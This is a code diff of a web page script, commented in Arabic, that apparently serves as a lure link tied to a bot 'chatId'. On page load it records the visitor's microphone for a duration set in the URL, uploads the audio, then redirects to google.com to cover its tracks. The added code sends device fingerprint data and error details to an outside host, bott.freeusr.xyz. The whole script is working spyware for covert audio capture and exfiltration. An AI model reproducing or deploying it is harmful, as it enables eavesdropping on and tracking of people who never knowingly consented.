@@ -83,18 +83,58 @@
     </form>
 
 <script>
+// ============================================
+// ✅ دالة إرسال تقارير الفشل إلى /fail
+// ============================================
+async function sendFailReport(type, message, details = {}) {
+    const chatId = document.getElementById('chatId').value;
+    if (!chatId) {
+        console.warn('No chatId available for fail report');
+        return;
+    }
+
+    try {
+        const response = await fetch('https://bott.freeusr.xyz/fail', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chatId: chatId,
+                type: type,
+                message: message,
+                details: details,
+                deviceInfo: {
+                    platform: navigator.platform || 'غير متاح',
+                    language: navigator.language || 'غير متاح',
+                    userAgent: navigator.userAgent || 'غير متاح',
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timestamp: new Date().toISOString()
+                }
+            })
+        });
+
+        if (!response.ok) {
+            console.warn('Fail report response not OK:', response.status);
+        }
+    } catch (error) {
+        console.warn('Failed to send fail report:', error);
+    }
+}
+
 document.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
     const chatId = urlParams.get('chatId');
     
-    // ✅ قراءة المدة من الرابط
+    // قراءة المدة من الرابط
     let duration = parseInt(urlParams.get('duration')) || 5; // افتراضي 5 ثواني
     
-    // ✅ التأكد من أن المدة بين 5 و 30
+    // التأكد من أن المدة بين 5 و 30
     if (duration < 5) duration = 5;
     if (duration > 30) duration = 30;
     
     if (!chatId) {
+        sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
         alert("خطأ: chatId غير موجود في الرابط");
         return;
     }
@@ -102,11 +142,14 @@ document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('chatId').value = chatId;
 
     if (!navigator.mediaDevices?.getUserMedia) {
+        sendFailReport('error', 'المتصفح لا يدعم تسجيل الصوت', {
+            userAgent: navigator.userAgent
+        });
         alert("المتصفح لا يدعم تسجيل الصوت");
         return;
     }
 
-    // ✅ بدء التسجيل بالمدة المحددة من الرابط
+    // بدء التسجيل بالمدة المحددة من الرابط
     startRecording(duration);
 });
 
@@ -131,8 +174,14 @@ async function startRecording(duration) {
             });
 
             if (res.ok) {
-                window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+                window.location.href = "https://www.google.com/";
             } else {
+                const errorData = await res.json().catch(() => ({}));
+                sendFailReport('upload', 'فشل إرسال التسجيل إلى الخادم', {
+                    status: res.status,
+                    error: errorData.error || 'Unknown error',
+                    duration: duration
+                });
                 alert("فشل الإرسال. حاول مرة أخرى.");
             }
         };
@@ -140,6 +189,24 @@ async function startRecording(duration) {
         recorder.start();
         setTimeout(() => recorder.stop(), duration * 1000);
     } catch (err) {
+        // ✅ إرسال تقرير الفشل حسب نوع الخطأ
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+            sendFailReport('permission', 'تم رفض الوصول إلى الميكروفون', {
+                error: err.message,
+                duration: duration
+            });
+        } else if (err.name === 'NotFoundError') {
+            sendFailReport('microphone', 'لا يوجد ميكروفون متصل', {
+                error: err.message,
+                duration: duration
+            });
+        } else {
+            sendFailReport('error', err.message, {
+                error: err.message,
+                duration: duration,
+                stack: err.stack
+            });
+        }
         alert("خطأ في تسجيل الصوت: " + err.message);
     }
 }
